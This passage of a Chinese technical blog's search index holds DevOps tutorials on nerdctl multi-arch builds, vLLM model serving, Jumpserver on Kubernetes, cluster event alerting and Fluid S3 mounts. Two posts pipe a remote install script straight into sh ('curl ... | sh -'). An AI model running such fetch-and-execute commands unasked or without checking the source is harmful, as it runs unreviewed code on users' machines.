创建一个测试 Dockerfile 1 2 3 4 cat \u0026lt;\u0026lt; EOF \u0026gt;Dockerfile FROM registry.cn-beijing.aliyuncs.com/opshub/ubuntu:20.04 RUN touch 123 EOF 构建多架构的镜像 1 nerdctl build --platform=amd64,arm64 -t registry-1.docker.io/shaowenchen/nerdctl-build:latest . 查看镜像信息 1 2 3 4 nerdctl images | grep nerdctl registry-1.docker.io/shaowenchen/nerdctl-build latest 3f2f8f7a36bd About a minute ago linux/amd64 77.9 MiB 26.2 MiB registry-1.docker.io/shaowenchen/nerdctl-build latest 3f2f8f7a36bd About a minute ago linux/arm64 0.0 B 24.8 MiB 推送多架构的镜像 1 nerdctl push --all-platforms registry-1.docker.io/shaowenchen/nerdctl-build:latest 5. Dockerfile 中的多架构变量 借助以下变量，可以下载不同架构的二进制文件，避免出现 exec format error 报错，镜像无法运行的问题。\nTARGETPLATFORM 构建镜像的目标平台，例如 linux/amd64, linux/arm/v7, windows/amd64。\nTARGETOS TARGETPLATFORM 的 OS 类型，例如 linux, windows\nTARGETARCH TARGETPLATFORM 的架构类型，例如 amd64, arm\nTARGETVARIANT TARGETPLATFORM 的变种，该变量可能为空，例如 v7\nBUILDPLATFORM 构建镜像主机平台，例如 linux/amd64\nBUILDOS BUILDPLATFORM 的 OS 类型，例如 linux\nBUILDARCH BUILDPLATFORM 的架构类型，例如 amd64\nBUILDVARIANT BUILDPLATFORM 的变种，该变量可能为空，例如 v7\n使用方式:\nDockerfile 中声明需要使用的 ARG 变量 使用 ${TARGETARCH} 引用变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 FROM alpine:latest as builder ARG TARGETARCH WORKDIR /data RUN wget https://github.com/git-lfs/git-lfs/releases/download/v3.4.0/git-lfs-linux-${TARGETARCH}-v3.4.0.tar.gz \u0026amp;\u0026amp; \\ tar xvfz git-lfs-linux-${TARGETARCH}-v3.4.0.tar.gz FROM alpine:latest RUN apk update \u0026amp;\u0026amp; \\ apk upgrade \u0026amp;\u0026amp; \\ apk add --update alpine-sdk \u0026amp;\u0026amp; \\ apk add --no-cache \\ git \\ openssh COPY --from=builder /data/git-lfs-3.4.0/git-lfs /usr/local/bin/git-lfs RUN git lfs install WORKDIR /runtime ENTRYPOINT [\u0026#34;git\u0026#34;] ","description":"","id":9,"section":"post","tags":["博文","多架构","镜像","CI","Nerdctl"],"title":"使用 Nerdctl 构建多架构镜像","uri":"https://www.chenshaowen.com/blog/use-nerdctl-to-build-multi-architecture-images.html"},{"content":"1. 制作镜像 为了方便测试，这里将模型文件打包到镜像中。\n下载模型 1 2 3 4 git clone https://huggingface.co/Qwen/Qwen1.5-1.8B-Chat cd Qwen1.5-1.8B-Chat \u0026amp;\u0026amp; git lfs pull rm -rf .git cd .. 编写 Dockerfile 1 2 3 4 5 cat \u0026lt;\u0026lt;EOF \u0026gt; Dockerfile FROM vllm/vllm-openai:latest RUN mkdir -p /models/Qwen1.5-1.8B-Chat COPY Qwen1.5-1.8B-Chat/* /models/Qwen1.5-1.8B-Chat EOF 编译镜像 1 nerdctl build --platform=amd64 -t registry-1.docker.io/shaowenchen/demo-vllm-qwen:1.5-1.8b-chat-amd64 . 推送镜像 1 nerdctl push --platform=amd64 registry-1.docker.io/shaowenchen/demo-vllm-qwen:1.5-1.8b-chat-amd64 为了方便国内的集群测试，我将镜像推送到了阿里云的容器镜像服务，registry.cn-beijing.aliyuncs.com/shaowenchen/demo-vllm-qwen\n2. 主机上推理服务 设置环境变量 国内\n1 export IMAGE=registry.cn-beijing.aliyuncs.com/shaowenchen/demo-vllm-qwen:1.5-1.8b-chat-amd64 国外\n1 export IMAGE=registry-1.docker.io/shaowenchen/demo-vllm-qwen:1.5-1.8b-chat-amd64 指定设备，运行服务 1 2 3 4 5 6 7 nerdctl run --gpus \u0026#34;device=1\u0026#34; \\ -p 8000:8000 \\ --name Qwen1.5-1.8B-Chat-allinone \\ --ipc=host \\ $IMAGE \\ --model /models/Qwen1.5-1.8B-Chat \\ --dtype=half 测试推理接口 1 2 3 4 5 6 7 8 9 curl http://127.0.0.1:8000/v1/chat/completions \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;model\u0026#34;: \u0026#34;/models/Qwen1.5-1.8B-Chat\u0026#34;, \u0026#34;messages\u0026#34;: [ {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;什么是大模型\u0026#34;} ], \u0026#34;max_tokens\u0026#34;: 1024 }\u0026#39; 清理容器 1 nerdctl rm Qwen1.5-1.8B-Chat-allinone 3. 集群上推理服务 设置环境变量 国内\n1 export IMAGE=registry.cn-beijing.aliyuncs.com/shaowenchen/demo-vllm-qwen:1.5-1.8b-chat-amd64 国外\n1 export IMAGE=registry-1.docker.io/shaowenchen/demo-vllm-qwen:1.5-1.8b-chat-amd64 设置运行节点\n1 export NODE_NAME= 部署负载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: apps/v1 kind: Deployment metadata: name: demo-vllm-qwen1.5-1.8b-chat namespace: default spec: replicas: 1 selector: matchLabels: app: demo-vllm-qwen1.5-1.8b-chat template: metadata: labels: app: demo-vllm-qwen1.5-1.8b-chat spec: nodeName: $NODE_NAME containers: - name: demo-vllm-qwen image: $IMAGE args: - \u0026#34;--dtype\u0026#34; - \u0026#34;half\u0026#34; - \u0026#34;--model\u0026#34; - \u0026#34;/models/Qwen1.5-1.8B-Chat\u0026#34; EOF 测试推理接口 1 kubectl exec -it deployment/demo-vllm-qwen1.5-1.8b-chat -- bash 1 2 3 4 5 6 7 8 9 curl http://127.0.0.1:8000/v1/chat/completions \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;model\u0026#34;: \u0026#34;/models/Qwen1.5-1.8B-Chat\u0026#34;, \u0026#34;messages\u0026#34;: [ {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;什么是大模型\u0026#34;} ], \u0026#34;max_tokens\u0026#34;: 1024 }\u0026#39; 清理负载 1 kubectl delete deployment demo-vllm-qwen1.5-1.8b-chat ","description":"","id":10,"section":"post","tags":["博文","vLLM","推理","AI"],"title":"使用 vLLM 应用验证推理节点","uri":"https://www.chenshaowen.com/blog/use-vllm-verify-inference-node.html"},{"content":"Embedding 模型 Embedding 模式将高维度的数据映射到低维度的空间，这样有利于数据的处理和分析。\n文本模型 这里有一个排行榜，https://huggingface.co/spaces/mteb/leaderboard\n在上面的排行榜中，会给出模型的评分，模型的参数量、内存使用、向量维度、最长 Token 等信息。下面是常用的开源模型:\ngte-Qwen2-7B-instruct https://huggingface.co/Alibaba-NLP/gte-Qwen2-7B-instruct\n维度 3584，最大 Token 131072，内存 28 GB\ngte-Qwen2-1.5B-instruct https://huggingface.co/Alibaba-NLP/gte-Qwen2-1.5B-instruct\n维度 1536，最大 Token 131072，内存 6 GB\n图像模型 找 ViT 模型，Vision Transformer (ViT) 是基于 Transformer 的新架构。\nclip-vit-base-patch32 https://huggingface.co/openai/clip-vit-base-patch32\n维度 512\nclip-vit-large-patch14 https://huggingface.co/openai/clip-vit-large-patch14\n维度 768\n向量数据库 向量数据库是专门为向量的存储和检索而设计的，在处理向量数据时，相较于传统数据库更加快速和准确。\npostgresql postgresql 从 13 版本开始，可以通过开源向量检索插件 PGVector 实现了向量检索功能。\n适用于对延时要求不高、成本敏感的场景。\nredis redis 从 2.4 版本开始正式支持向量检索，在 7.2 版本中对向量检索功能进行了重大更新和优化，支持 HNSW 检索。\n适用于对延时要求高，查询频繁，需要简单快速部署的场景。\nelasticsearch elasticsearch 从 7.0 版本开始增加对向量字段的支持、8.0 版本引入了原生支持 ANN 、HNSW 检索。\n适用于大规模数据，需要混合文本、结构化数据和向量数据的场景。\nChroma https://github.com/chroma-core/chroma\nChroma 是一个用 Rust 和 Python 构建的向量数据库，以其简单易用性著称。它对多媒体内容处理有很好的支持，特别适合快速原型开发和实验。\nMilvus https://github.com/milvus-io/milvus\nMilvus 是用 Go 和 C++ 开发的分布式向量数据库，提供强大的通用数据处理能力，在推荐系统、语言和视觉分析等场景表现出色。\nFaiss https://github.com/facebookresearch/faiss\nFaiss 是 Facebook 开源的 C++ 向量检索库，其最大特点是支持 GPU 加速，能够高效处理大规模向量搜索任务。\nWeaviate https://github.com/weaviate/weaviate\nWeaviate 是一个用 Go 实现的向量搜索引擎，提供 GraphQL 接口，特别擅长知识图谱集成和复杂查询处理。\nQdrant https://github.com/qdrant/qdrant\nQdrant 是一个用 Rust 开发的向量相似度搜索引擎，支持复杂的元数据过滤查询，在推荐系统、语义搜索和多模态搜索方面表现优异。\nAgent 框架 Agent 框架能实现对任务的规划、分析、自动化执行的能力。\nAutoGPT https://github.com/Significant-Gravitas/AutoGPT\nAutoGPT 是一个强大的自主 AI 代理系统,可以独立完成复杂目标,支持互联网搜索、代码生成和任务执行等功能。它采用 GPT-4 作为决策引擎,内置了丰富的工具集成。\nAutoGen https://github.com/microsoft/autogen\nAutoGen 是微软开发的多智能体对话框架,支持多个 AI 代理之间的协作对话。它提供了丰富的预置智能体模板,可以实现代码生成、数学推理等复杂任务。\nLangfuse https://github.com/langfuse/langfuse\nLangfuse 是一个专注于 LLM 应用开发和监控的平台,提供完整的性能分析、日志记录和版本管理功能,帮助开发者更好地构建和优化 AI 应用。\nChatDev https://github.com/OpenBMB/ChatDev\nChatDev 是一个面向软件开发的智能体框架,通过模拟完整的开发团队角色来实现从需求到代码的自动化。它支持多种编程语言,提供全流程的项目管理。\nBabyAGI https://github.com/yoheinakajima/babyagi\nBabyAGI 是一个轻量级的任务规划执行框架,采用简单的任务分解模型,适合学习和实验。它具备基础的记忆存储功能,代码结构清晰易懂。\nSuperAGI https://github.com/TransformerOptimus/SuperAGI\nSuperAGI 是一个企业级的 AI 代理开发框架,提供图形化界面和完整的智能体管理功能。它支持多种工具集成,具备详细的执行日志和分析能力。\nMetaGPT https://github.com/geekan/MetaGPT\nMetaGPT 是一个专注于软件工程的智能体框架,支持从需求分析到系统设计的全生命周期。它提供多种预定义角色模板,支持自动化代码生成和文档编写。\n流程编排 LangChain https://github.com/langchain-ai/langchain\nLangChain 通过一系列的 Chain 将应用开发过程中可能涉及的流程串起来，同时也提供了提示词、记忆等功能，使得开发者可以更快的开发 AI 应用。\nFastGPT https://github.com/labring/FastGPT\nFastGPT 是一个基于 LLM 大语言模型的知识库问答系统，提供开箱即用的数据处理、模型调用等能力。同时可以通过 Flow 可视化进行工作流编排，从而实现复杂的问答场景！\nDify https://github.com/langgenius/dify\nDify 提供了 Workflow 功能，允许用户通过可视化的方式创建和管理任务流程。\n模型部署 Ollama https://github.com/ollama/ollama\nOllama 提供简单易用的界面，让用户能够在本地设备上轻松运行和管理大模型。\nvLLM https://github.com/vllm-project/vllm\nvLLM 是一个用于大模型推理服务部署的项目，使用 PageddAttention 机制提高内存利用率。是非常适合生产环境部署模型的工具。vLLM 能适配各种硬件，包括 CPU、GPU、TPU 等。\nTriton Server https://github.com/triton-inference-server/server\nTriton Server 是 NVIDIA 开源的推理服务框架，支持多种模型格式，包括 ONNX、TensorRT、PyTorch、TensorFlow 等。如果仅针对 NVIDIA GPU 硬件，Triton Server 是一个非常好的选择。\n模型微调 Llama-factory https://github.com/hiyouga/LLaMA-Factory\nLlama-factory 是一个统一的 LLM 微调框架，支持多种主流模型（如 Llama、Mistral、Qwen 等）的训练。它提供了丰富的训练方法（包括 LoRA、QLoRA、全参数微调等）和多样的训练任务类型，使用简单且功能全面。\nunsloth https://github.com/unslothai/unsloth\nunsloth 是一个高效的 LLM 微调工具，专注于提供更快的训练速度和更低的显存占用。它通过优化底层实现和创新的训练方法，能显著提升 LoRA 等微调技术的效率，特别适合在有限算力条件下进行模型训练。\n模型训练 Pytorch https://github.com/pytorch/pytorch\nPytorch 是 Facebook 开源的深度学习框架，非常适合大模型的训练，对用户提供了各种易于使用的机械学习库，对各种硬件、拓扑结构都有很好的支持。\nMegatron-LM https://github.com/NVIDIA/Megatron-LM\nMegatron-LM 基于 PyTorch 构建，但是针对大模型训练进行了优化，支持多 GPU、多节点训练，适合大规模模型训练。\nDeepSpeed https://github.com/microsoft/DeepSpeed\nDeepSpeed 是一个由微软开发的深度学习优化库，利用 ZeRO 优化优化技术可以将模型参数、梯度和优化器状态分割到多个 GPU 或节点上，从而减少内存占用，提高训练效率。\n","description":"","id":11,"section":"post","tags":["博文","AI","应用开发"],"title":"AI 应用开发技术栈","uri":"https://www.chenshaowen.com/blog/ai-application-development-tech-stack.html"},{"content":"1. 部署 Jumpserver 需要提前准备好 StorageClass，用于存储 Jumpserver 的数据。除了下面提到的数据库，各个组件 jms-core、jms-web、jms-koko、jms-lion、jms-chen 都需要一个 PV 存储。\n1.1 部署 MySQL 参考 https://github.com/shaowenchen/hubimage/blob/main/database/mysql8.yaml ，部署 MySQL。\n需要调整一下 StorageClass 字段为集群中的可用值。\n1.2 部署 Redis 参考 https://github.com/shaowenchen/hubimage/blob/main/database/redis7.yaml ，部署 Redis。\n需要调整一下 StorageClass 字段为集群中的可用值。\n3. 部署 Jumpserver 添加 Helm 仓库 1 2 helm repo add jumpserver https://jumpserver.github.io/helm-charts helm repo update 修改 values.yaml https://github.com/jumpserver/helm-charts/blob/main/charts/jumpserver/values.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 global: storageClass: \u0026#34;\u0026#34; externalDatabase: engine: mysql host: port: user: password: database: externalRedis: host: port: password: \u0026#34;\u0026#34; 这里主要需要修改的是 global.storageClass、externalDatabase 和 externalRedis。\n如果部署的集群对 docker hub 有访问限制，还需要修改 imageRegistry 和 imageOwner。当然，还可以直接去 https://github.com/jumpserver/helm-charts/releases 下载最新的 release 版本，解压之后将镜像地址修改为自己的私有仓库地址。\n安装 Jumpserver 1 helm install jms-k8s jumpserver/jumpserver -n jumpserver -f values.yaml 卸载命令\n1 helm uninstall jms-k8s -n jumpserver 新增访问入口 如果使用 NodePort 方式访问，除了修改 jumpserver-jms-web 为 NodePort 类型之外，还需要给 jumpserver-jms-core 添加环境变量 DOMAINS 允许新的访问入口，否则会出现如下提示:\n1 2 3 配置文件有问题，无法登录，请联系管理员或查看最新文档 如果你是管理员，可以更新配置文件解决，设置配置项 DOMAINS=x.x.x.x:x 编辑 jumpserver-jms-core :\n1 kubectl -n jumpserver edit deployments.apps jms-k8s-jumpserver-jms-core 添加环境变量：\n1 2 - name: DOMAINS value: x.x.x.x:x 首次访问 首次访问需要重置 admin 用户的密码是 ChangeMe，登录之后会提示修改密码。\n2. 资源导入 2.1 添加节点 点击页面左侧的 【资产管理 - 资产列表】，在根节点 Default 右键新节点。\n节点其实就是给资产分组，这里新建一个节点，命名为 worker。\n2.2 创建访问主机的账号 点击页面左侧的 【账号模板 】 创建一个特权用户 root。\n2.3 脚本添加主机 设置环境变量 1 2 export JUMPSERVER=\u0026#34;http://x.x.x.x:x\u0026#34; export JUMPSERVER_PASSWORD=\u0026#34;xxx\u0026#34; 获取 Token 1 2 3 4 5 curl -X POST \u0026#34;${JUMPSERVER}/api/v1/authentication/auth/\u0026#34; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#34;{\\\u0026#34;username\\\u0026#34;: \\\u0026#34;admin\\\u0026#34;, \\\u0026#34;password\\\u0026#34;: \\\u0026#34;${JUMPSERVER_PASSWORD}\\\u0026#34;}\u0026#34; {\u0026#34;token\u0026#34;:\u0026#34;xxx\u0026#34;} 设置 Token 1 export JUMPSERVER_TOKEN=\u0026#34;xxx\u0026#34; 设置导入的分组和模板账号 点击页面左侧的 【账号模板 】 中找到 root 账号，点击进入，即可看到账户模板的 id。\n1 export JUMPSERVER_ACCOUNT_ID=\u0026#34;xxx\u0026#34; 1 2 3 4 export GROUP_NAME=\u0026#34;worker\u0026#34; curl -s -H \u0026#34;Authorization: Bearer $JUMPSERVER_TOKEN\u0026#34; \u0026#34;$JUMPSERVER/api/v1/assets/nodes/\u0026#34; | jq -r --arg GROUP_NAME \u0026#34;$GROUP_NAME\u0026#34; \u0026#39;.[] | select(.name==$GROUP_NAME) | .id\u0026#39; xxx 设置 GROUP_ID\n1 export GROUP_ID=\u0026#34;xxx\u0026#34; 编写脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 create_host() { HOST_NAME=\u0026#34;$1\u0026#34; IP=\u0026#34;$2\u0026#34; data=$(cat \u0026lt;\u0026lt;EOF { \u0026#34;name\u0026#34;: \u0026#34;$HOST_NAME\u0026#34;, \u0026#34;address\u0026#34;: \u0026#34;$IP\u0026#34;, \u0026#34;platform\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;protocols\u0026#34;: [{\u0026#34;name\u0026#34;: \u0026#34;ssh\u0026#34;, \u0026#34;port\u0026#34;: 22}], \u0026#34;is_active\u0026#34;: true, \u0026#34;nodes\u0026#34;: [\u0026#34;$GROUP_ID\u0026#34;], \u0026#34;accounts\u0026#34;: [{\u0026#34;template\u0026#34;: \u0026#34;$JUMPSERVER_ACCOUNT_ID\u0026#34;}] } EOF ) response=$(curl -s -X POST \\ -H \u0026#34;Authorization: Bearer $JUMPSERVER_TOKEN\u0026#34; \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#34;$data\u0026#34; \\ \u0026#34;$JUMPSERVER/api/v1/assets/hosts/\u0026#34;) echo \u0026#34;Result: $response\u0026#34; } 创建主机 1 create_host \u0026#34;x.x.x.x\u0026#34; \u0026#34;x.x.x.x\u0026#34; 2.4 批量添加主机 1 2 3 kubectl get nodes -o wide | awk \u0026#39;NR\u0026gt;1 {print $6}\u0026#39; | grep -v \u0026#34;\u0026lt;none\u0026gt;\u0026#34; | while read ip; do create_host $ip $ip done 2.5 重置 admin 密码 进入 jumpserver core 容器 1 kubectl -n jumpserver exec -it jms-k8s-jumpserver-jms-core-676b986bdd-6bpp8 -- bash 重置密码 1 cd /opt/jumpserver/apps 1 python manage.py changepassword admin 3 授权用户访问 这里涉及到三个对象：\n用户 资产，主机、数据库、集群等资源 用户与资产的授权规则 如果是对单个用户授权，需要进行一下操作：\n在 【用户管理-用户列表】 中添加用户 在 【授权管理-资产授权】 中添加授权规则 创建授权规则时，选择用户，选择资产即可。\n如果是对多个用户授权，可以创建一个用户组，将用户添加到用户组中，然后对用户组授权。\n如果是对大批量的资源授权，需要将这些资源放到一个节点下，然后对用户授权这个节点。\n4. 参考 https://docs.jumpserver.org/zh/master/install/setup_by_fast/ ","description":"","id":12,"section":"post","tags":["博文","Kubernetes","Jumpserver","基础运维"],"title":"在 Kubernetes 部署 Jumpserver 跳板机","uri":"https://www.chenshaowen.com/blog/how-to-deploy-jumpserver-on-kubernetes.html"},{"content":" https://github.com/shaowenchen/ops\n1. 告警 Kubernetes 集群的事件 监控指定的关键字 1 2 3 4 5 6 7 8 9 10 11 apiVersion: crd.chenshaowen.com/v1 kind: EventHooks metadata: name: kube-pod-falid namespace: ops-system spec: type: xiezuo url: https://xz.wps.cn/api/v1/webhook/send?key= subject: \u0026#34;ops.clusters.*.namespaces.*.pods.*.event\u0026#34; keywords: - failed 一份简单的配置，即可收获大量的相关告警。\n监控之后，自动化处理 1 2 3 4 5 6 7 8 9 10 11 12 apiVersion: crd.chenshaowen.com/v1 kind: EventHooks metadata: name: kube-no-free-node namespace: ops-system spec: additional: \u0026#34;action: restart-kubelet-bypod\u0026#34; keywords: - no free node subject: ops.clusters.*.namespaces.*.pods.*.event type: webhook url: http://x.x.x.x/webhook 借助 Ops Copilot 的执行能力，只需要将相关的告警添加 Action 然后抛给 Copilot，即可实现自动化处理。\n上图就是为了解决某种异常情况下，自动重启节点的 Kubelet 以恢复节点的可用性。\n2. 使用 Ops 观测事件 在 Ops 项目的 Server 中，集成有一个 UI 端，可以查看所有的事件。\n支持三种形式的事件查询:\n直接查询 1 ops.clusters.mycluster.namespaces.ai-translate.pods.ciba-translate-ec--long-v1-74b88d9f74-9zpv7.event 通配符 1 ops.clusters.mycluster.namespaces.ops-system.taskruns.alert-npu-drop.reports.* reports 是 Ops 巡检主动上报的事件，是自动采集集群事件之外的另一个大的分类。\n前缀匹配 1 ops.clusters.*.namespaces.ops-system.hosts.\u0026gt; 这里定义一个事件对象的概念: 一组相关联的事件序列描述的对象，比如一个 Pod，一个节点，一个应用，一个人的操作等。\n在 Nats 中主要是通过 Subjects 来区分不同事件，Nats 支持最多 16 个 domain，256 字符长度。\n因此，在 Ops 中一个事件对象与一个 Subject 对应，并通过 Restful 风格的 Subject 名。\n1 ops.clusters.{cluster}.namespaces.{namespace}.pods.{pod}.event 3. 如何安装和使用 Ops 的事件能力 在 https://www.chenshaowen.com/ops/zh/opscontroller.html 提供有详细的安装文档。\n添加 Helm 仓库 1 helm repo add ops https://www.chenshaowen.com/ops/charts 安装 ops-controller-manager 1 helm install myops ops/ops --version 2.0.0 --namespace ops-system --create-namespace 安装 2.0.0 版本的 Ops，需要注意的是 2.0.0 版本是下一个 Release 版本，目前还在开发中。\n查看安装结果 1 kubectl get pods -n ops-system 4. 关于通知支持的通知类型 目前仅支持了两种:\nxiezuo webhook 当然，各种通知类型加起来很快，可以给我提交 https://github.com/shaowenchen/ops/issues 。如果测试条件满足，当天就能发布。\n添加新的通知类型，并不需要修改 CRD 的结构，只需要更新一下 Controller 的镜像。\n5. 并不会对 kube-apiserver 产生额外的压力 如上图，在采集集群 Event 之后，kube-apiserver 相关指标没有产生明显恶化，波动在日常区间之类，可以放心使用。\n","description":"","id":13,"section":"post","tags":["博文","Ops","运维","事件","copilot","自动化"],"title":"使用 Ops 项目查看并监控集群事件","uri":"https://www.chenshaowen.com/blog/use-ops-to-view-and-monitor-cluster-events.html"},{"content":" 本文使用的是 Fluid 1.0 版本，高版本的配置文件路径发生了变化，需要根据实际情况调整。\n1. 制作镜像 1.1 fluid_config_init.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #!/usr/bin/env python import json import os rawStr = \u0026#34;\u0026#34; with open(\u0026#34;/etc/fluid/config.json\u0026#34;, \u0026#34;r\u0026#34;) as f: rawStr = f.readlines() rawStr = rawStr[0] script = \u0026#34;\u0026#34;\u0026#34; #!/bin/sh set -ex MNT_TO=$targetPath trap \u0026#34;umount ${MNT_TO}\u0026#34; SIGTERM mkdir -p ${MNT_TO} || true s3fs $bucket:$bucketPath $MNT_TO -o url=$url -o allow_other -f -d -o f2 echo \u0026#34;mounted and exit code: $?\u0026#34; sleep inf \u0026#34;\u0026#34;\u0026#34; obj = json.loads(rawStr) with open(\u0026#34;/root/.passwd-s3fs\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#34;%s:%s\\n\u0026#34; % (obj[\u0026#34;mounts\u0026#34;][0][\u0026#34;options\u0026#34;][\u0026#34;s3-access-key\u0026#34;], obj[\u0026#34;mounts\u0026#34;][0][\u0026#34;options\u0026#34;][\u0026#34;s3-access-secret\u0026#34;])) # set /root/.passwd-s3fs to be read only by owner os.chmod(\u0026#34;/root/.passwd-s3fs\u0026#34;, 0o600) bucketPath = obj[\u0026#34;mounts\u0026#34;][0][\u0026#34;mountPoint\u0026#34;].lstrip(\u0026#34;s3://\u0026#34;).rstrip(\u0026#34;/\u0026#34;) bucket = bucketPath.split(\u0026#34;/\u0026#34;)[0] bucketPath = bucketPath[len(bucket):] with open(\u0026#34;/mount-s3.sh\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#39;targetPath=\u0026#34;%s\u0026#34;\\n\u0026#39; % obj[\u0026#34;targetPath\u0026#34;]) f.write(\u0026#39;bucket=\u0026#34;%s\u0026#34;\\n\u0026#39; % bucket) f.write(\u0026#39;bucketPath=\u0026#34;%s\u0026#34;\\n\u0026#39; % bucketPath) f.write(\u0026#39;url=\u0026#34;%s\u0026#34;\\n\u0026#39; % obj[\u0026#34;mounts\u0026#34;][0][\u0026#34;options\u0026#34;][\u0026#34;url\u0026#34;]) f.write(script) 1.2 entrypoint.sh 1 2 3 4 5 6 #!/usr/bin/env bash set +x python /fluid_config_init.py chmod u+x /mount-s3.sh bash /mount-s3.sh 1.3 Dockerfile 1 2 3 4 5 6 FROM hubimage/runtime-ubuntu:20.04 RUN apt-get update \u0026amp;\u0026amp; apt-get install -y python s3fs COPY ./fluid_config_init.py / COPY ./entrypoint.sh /usr/local/bin/ RUN chmod +x /usr/local/bin/entrypoint.sh ENTRYPOINT [] 1.4 构建镜像 1 2 docker build . --network=host -f Dockerfile -t shaowenchen/demo-fluid-s3fs:latest docker push shaowenchen/demo-fluid-s3fs:latest 1. 挂载 S3 存储 配置环境变量 1 2 3 4 export ENDPOINT=obs.ap-southeast-3.myhuaweicloud.com export BUCKET= export AK= export SK= 创建 Dataset 1 2 3 4 5 6 7 8 9 10 11 12 13 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: mys3fs spec: mounts: - mountPoint: s3://${BUCKET}/test1 options: s3-access-key: ${AK} s3-access-secret: ${SK} url: https://${ENDPOINT} EOF 创建 ThinRuntimeProfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: ThinRuntimeProfile metadata: name: s3fs-profile spec: fileSystemType: s3fs fuse: image: shaowenchen/demo-fluid-s3fs imageTag: latest imagePullPolicy: Always command: - \u0026#34;/usr/local/bin/entrypoint.sh\u0026#34; EOF 创建 ThinRuntime 1 2 3 4 5 6 7 8 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: ThinRuntime metadata: name: mys3fs-37 spec: profileName: s3fs-profile EOF 创建 Pod 负载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: mys3fs spec: containers: - name: mys3fs image: shaowenchen/demo-ubuntu volumeMounts: - mountPath: /data name: mys3fs volumes: - name: mys3fs persistentVolumeClaim: claimName: mys3fs EOF 2. 性能测试 进入 Pod\n1 kubectl exec -it mys3fs -- bash 执行\n1 curl -sSL https://d.juicefs.com/install | sh - 安装 JuiceFS 客户端\n1 2 3 4 5 6 7 8 9 10 11 12 13 juicefs bench --block-size 4 --big-file-size 1024 /data Benchmark finished! BlockSize: 4.0 MiB, BigFileSize: 1.0 GiB, SmallFileSize: 128 KiB, SmallFileCount: 100, NumThreads: 1 +------------------+-----------------+----------------+ | ITEM | VALUE | COST | +------------------+-----------------+----------------+ | Write big file | 194.80 MiB/s | 5.26 s/file | | Read big file | 100.50 MiB/s | 10.19 s/file | | Write small file | 3.6 files/s | 277.70 ms/file | | Read small file | 51.1 files/s | 19.59 ms/file | | Stat file | 26301.5 files/s | 0.04 ms/file | +------------------+-----------------+----------------+ 3. 清理资源 1 2 3 kubectl delete pod mys3fs kubectl delete thinruntime mys3fs kubectl delete dataset mys3fs ","description":"","id":14,"section":"post","tags":["博文","s3","Fluid","JuiceFS","AI","Data"],"title":"使用 Fluid 和 S3FS 对接 S3 存储及性能测试","uri":"https://www.chenshaowen.com/blog/using-fluid-and-s3fs-to-access-s3-storage-and-performance-testing.html"},{"content":"1. Jindo 挂载 S3 配置环境变量 1 2 3 4 export ENDPOINT=obs.ap-southeast-3.myhuaweicloud.com export BUCKET= export AK= export SK= 创建凭证 1 2 3 4 5 6 7 8 9 10 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Secret metadata: name: mys3secret type: Opaque stringData: fs.s3.accessKeyId: ${AK} fs.s3.accessKeySecret: ${SK} EOF 创建 Dataset 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: mys3-jindo spec: mounts: - mountPoint: s3://${BUCKET}/test2/ options: fs.s3.endpoint: ${ENDPOINT} encryptOptions: - name: fs.s3.accessKeyId valueFrom: secretKeyRef: name: mys3secret key: fs.s3.accessKeyId - name: fs.s3.accessKeySecret valueFrom: secretKeyRef: name: mys3secret key: fs.s3.accessKeySecret accessModes: - ReadWriteMany EOF 创建 JindoRuntime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: JindoRuntime metadata: name: mys3-jindo spec: replicas: 2 tieredstore: levels: - mediumtype: SSD path: /cache quota: 40960 low: \u0026#34;0.1\u0026#34; EOF 创建 Pod 负载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: mys3-jindo spec: containers: - name: demo image: shaowenchen/demo-ubuntu volumeMounts: - mountPath: /data name: data volumes: - name: data persistentVolumeClaim: claimName: mys3-jindo EOF 2. 性能测试 进入 Pod\n1 kubectl exec -it mys3-jindo -- bash 执行\n1 curl -sSL https://d.juicefs.com/install | sh - 安装 JuiceFS 客户端\n1 2 3 4 5 6 7 8 9 10 11 12 13 juicefs bench --block-size 4 --big-file-size 1024 /data Benchmark finished! BlockSize: 4.0 MiB, BigFileSize: 1.0 GiB, SmallFileSize: 128 KiB, SmallFileCount: 100, NumThreads: 1 +------------------+--------------+----------------+ | ITEM | VALUE | COST | +------------------+--------------+----------------+ | Write big file | 394.04 